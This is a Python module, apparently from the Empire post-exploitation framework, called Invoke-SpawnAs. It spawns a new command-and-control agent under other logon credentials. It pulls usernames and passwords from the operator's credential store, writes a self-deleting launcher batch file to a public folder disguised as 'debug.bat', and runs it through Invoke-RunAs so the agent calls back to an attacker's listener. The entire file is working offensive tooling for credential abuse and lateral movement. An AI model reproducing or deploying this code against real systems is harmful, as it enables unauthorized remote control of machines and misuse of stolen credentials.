from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-SpawnAs',

            'Author': ['rvrsh3ll (@424f424f)', '@harmj0y'],

            'Description': ('Spawn an agent with the specified logon credentials.'),

            'Background' : False,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : False,
            
            'MinPSVersion' : '2',
            
            'Comments': [
                'https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/RunAs.ps1'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'CredID' : {
                'Description'   :   'CredID from the store to use.',
                'Required'      :   False,
                'Value'         :   ''                
            },
            'Domain' : {
                'Description'   :   'Optional domain.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'UserName' : {
                'Description'   :   'Username to run the command as.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Password' : {
                'Description'   :   'Password for the specified username.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):
        
        # read in the common powerup.ps1 module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/management/Invoke-RunAs.ps1"

        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        script = f.read()
        f.close()

        # if a credential ID is specified, try to parse
        credID = self.options["CredID"]['Value']
        if credID != "":
            
            if not self.mainMenu.credentials.is_credential_valid(credID):
                print helpers.color("[!] CredID is invalid!")
                return ""

            (credID, credType, domainName, userName, password, host, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]

            if domainName != "":
                self.options["Domain"]['Value'] = domainName
            if userName != "":
                self.options["UserName"]['Value'] = userName
            if password != "":
                self.options["Password"]['Value'] = password

        # extract all of our options
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']

        # generate the .bat launcher code to write out to the specified location
        #   this is because the System.Diagnostics.ProcessStartInfo method appears
        #   to have a length limit on the arguments passed :(
        l = self.mainMenu.stagers.stagers['launcher_bat']
        l.options['Listener']['Value'] = self.options['Listener']['Value']
        l.options['UserAgent']['Value'] = self.options['UserAgent']['Value']
        l.options['Proxy']['Value'] = self.options['Proxy']['Value']
        l.options['ProxyCreds']['Value'] = self.options['ProxyCreds']['Value']
        l.options['Delete']['Value'] = "True"
        launcherCode = l.generate()

        # PowerShell code to write the launcher.bat out
        script += "$tempLoc = \"$env:public\debug.bat\""
        script += "\n$batCode = @\"\n" + launcherCode + "\"@\n"
        script += "$batCode | Out-File -Encoding ASCII $tempLoc ;\n"
        script += "\"Launcher bat written to $tempLoc `n\";\n"
  
        script += "\nInvoke-RunAs "
        script += "-UserName %s " %(self.options["UserName"]['Value'])
        script += "-Password %s " %(self.options["Password"]['Value'])

        domain = self.options["Domain"]['Value']
        if(domain and domain != ""):
            script += "-Domain %s " %(domain)

        script += "-Cmd \"$env:public\debug.bat\""

        return script
